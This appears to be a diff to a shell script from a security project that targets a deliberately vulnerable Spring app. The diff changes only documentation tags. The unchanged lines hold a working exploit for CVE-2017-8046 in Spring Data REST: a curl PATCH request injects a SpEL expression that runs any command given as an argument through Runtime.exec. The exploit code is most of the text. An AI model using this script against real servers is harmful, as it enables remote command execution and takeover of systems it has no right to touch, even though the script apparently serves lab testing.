@@ -15,10 +15,10 @@
 # Link: https://github.com/m3ssap0/SpringBreakVulnerableApp
 # License: MIT
 #
-# tag::sb_2017-8046.sh[]
+# tag::code[]
 APP_URL=$1
 REMOTE_COMMAND=$2
 
 curl -i -X POST -H "Content-Type: application/json" -d '{ "name" : "Test", "attribute" : "foo"}' http://$APP_URL/entity
 curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Runtime).getRuntime().exec(\"'$REMOTE_COMMAND'\").x", "value" : "pwned" }]' "http://$APP_URL/entity/1/"
-# tag::sb_2017-8046.sh[]
+# end::code[]
